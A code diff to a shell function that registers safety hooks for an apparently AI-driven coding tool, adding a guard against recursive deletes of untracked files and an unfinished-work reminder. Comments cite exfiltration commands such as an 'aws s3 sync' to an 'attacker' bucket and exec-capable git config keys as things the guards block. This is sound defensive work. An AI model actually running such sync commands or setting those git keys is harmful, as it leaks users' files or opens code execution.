@@ -107,6 +107,8 @@ get_hooks_for_mode() {
   # `aws s3 sync . s3://attacker`, `rsync -a . host:` slip through. ASK on the SHAPE
   # (archive-to-network-sink, or whole cwd/root/home sync to remote). Anchored so local
   # archives + build-dir deploys pass. /profile-gated. Disable: SUPERCHARGER_BULK_EXFIL_GUARD=0.
+  # Asks before a recursive rm deletes unsaved (untracked, not ignored) files; the prompt says how many.
+  hooks+=("PreToolUse|Bash,Monitor,PowerShell|${hooks_dir}/blast-radius-guard.sh|")
   hooks+=("PreToolUse|Bash,Monitor,PowerShell|${hooks_dir}/bulk-exfil-guard.sh|block")  # v2.23.21: `git config`/`git -c` setting an EXEC-CAPABLE key (core.fsmonitor,
   # sshCommand, credential.helper, pager/editor, alias '!sh', filter clean/smudge,
   # diff/difftool/mergetool cmd, persistent hooksPath) → RCE on the next git op
@@ -178,6 +180,9 @@ get_hooks_for_mode() {
   hooks+=("SessionStart||${hooks_dir}/dependency-preflight.sh|")
   # Every mode: a guard that cannot run lets every call through, silently.
   hooks+=("SessionStart||${hooks_dir}/guard-drift-alarm.sh|")
+  # Work still running when a session ended (Stop snapshot), named at the next start.
+  hooks+=("Stop|*|${hooks_dir}/unfinished-work.sh|async")
+  hooks+=("SessionStart||${hooks_dir}/unfinished-work.sh|")
   hooks+=("SessionStart||${hooks_dir}/plugin-config-seed.sh|")
   # v2.26.0: writes the three settings.json keys a plugin cannot declare (statusLine,
   # env.ENABLE_PROMPT_CACHING_1H, attribution). A hook can do this because hooks are
